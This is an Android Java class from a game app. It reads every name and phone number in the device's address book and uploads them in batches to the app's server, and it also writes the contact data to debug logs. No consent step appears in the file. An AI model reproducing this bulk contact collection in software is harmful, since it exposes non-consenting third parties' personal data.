package com.egame.app.tasks;

import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

import org.apache.http.NameValuePair;
import org.apache.http.message.BasicNameValuePair;
import org.json.JSONArray;
import org.json.JSONObject;

import android.content.Context;
import android.content.res.Resources.NotFoundException;
import android.database.Cursor;
import android.os.AsyncTask;
import android.provider.ContactsContract;

import com.egame.config.Urls;
import com.egame.utils.common.HttpConnect;
import com.egame.utils.common.L;

/**
 * @desc
 * 
 * @Copyright lenovo
 * 
 * @Project EGame4th
 * 
 * @timer 2012-3-28
 * 
 * @Version 1.0.0
 * 
 * @JDK version used 6.0
 * 
 * @Modification history none
 * 
 * @Modified by none
 */
public class UploadContacts extends AsyncTask<String, Integer, String> {
	private Context context;
	private String mUserId;
	String s = "";

	public UploadContacts(Context context, String userId) {
		this.context = context;
		mUserId = userId;
		System.out.println("UploadContacts userId=" + mUserId);
	}

	@Override
	protected String doInBackground(String... params) {
		try {
			s = HttpConnect.getHttpString(Urls
					.getIsUploadContacts(mUserId + ""));
			JSONObject json = new JSONObject(s);
			// xmlBean = HttpConnect.getHttpData(ServiceUrls.getIsUploadUrl() +
			// "?USERID=" + PersonalcenterBean.id, 5000,
			// listTag);
			int isUpload = json.getJSONObject("result").optInt("resultcode");
			if (isUpload == 1) {
				L.d("JK", "通讯录，已经上传");
				return null;
			} else if (isUpload == 0) {
				// L.d("RT0", "未上传,开始上传" + ServiceUrls.getIsUploadUrl() + "==="
				// + s);
				L.d("JK", "未上传,开始上传");
				List<Map<String, Object>> list = getAllContactsFromLocal();
				JSONArray array = new JSONArray();
				int i = 0;
				for (Map<String, Object> map : list) {
					JSONObject obj = new JSONObject();
					try {
						obj.put("linkphone", map.get("number"));
						obj.put("linkman", map.get("name"));
						array.put(obj);
						if (i > 30) {
							// L.d("JK","send:"+i);
							sendContacts(array);
							i = 0;
							array = new JSONArray();
						}
						i++;
					} catch (Exception e) {
						e.printStackTrace();
					}
				}
				L.d("JK", "send:" + i);
				sendContacts(array);
				return null;
			}
			// if (s.equals("true")) {
			// return null;
			// }
		} catch (Exception e1) {
			e1.printStackTrace();
			return null;
		}
		return s;
	}

	/**
	 * 获取本地通讯录
	 * 
	 * @return 返回列表
	 */
	private List<Map<String, Object>> getAllContactsFromLocal() {
		List<Map<String, Object>> phoneInfos = new ArrayList<Map<String, Object>>();
		Cursor contacts = context.getContentResolver().query(
				ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
		try {
			if (contacts.getCount() > 0) {
				while (contacts.moveToNext()) {
					Map<String, Object> map = new HashMap<String, Object>();
					String contactId = contacts.getString(contacts
							.getColumnIndex(ContactsContract.Contacts._ID));
					String name = contacts
							.getString(contacts
									.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
					int hasPhone = contacts
							.getInt(contacts
									.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER));
					String number = "";
					if (hasPhone == 1) {
						Cursor phones = null;
						try {
							phones = context
									.getContentResolver()
									.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
											null,
											ContactsContract.CommonDataKinds.Phone.CONTACT_ID
													+ " = " + contactId, null,
											null);
							if (phones != null) {
								phones.moveToFirst();
								number = phones
										.getString(phones
												.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
								phones.close();
							}

						} catch (Exception e) {
							e.printStackTrace();
						}
					}

					map.put("name", name);
					number = number.replaceAll("-", "");
					number = number.replaceAll("\\+86", "");
					number = number.trim();
					try {
						Long.parseLong(number);
						map.put("number", number);
						phoneInfos.add(map);
					} catch (Exception e) {

					}
				}
			} else {
				// 提示木有联系人的相关信息
			}
		} catch (NotFoundException e) {
			e.printStackTrace();
		} finally {
			contacts.close();
		}
		return phoneInfos;
	}

	private void sendContacts(JSONArray array) {
		String s = array.toString();
		L.d("JK", s);
		List<NameValuePair> postlist = new ArrayList<NameValuePair>();
		postlist.add(new BasicNameValuePair("CONTACTS", s));
		try {
			String result = HttpConnect.postHttpString(Urls.BASE_URL + "four/user/contact.json?USERID=" + mUserId, postlist);
			L.d("JK", result);
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

}
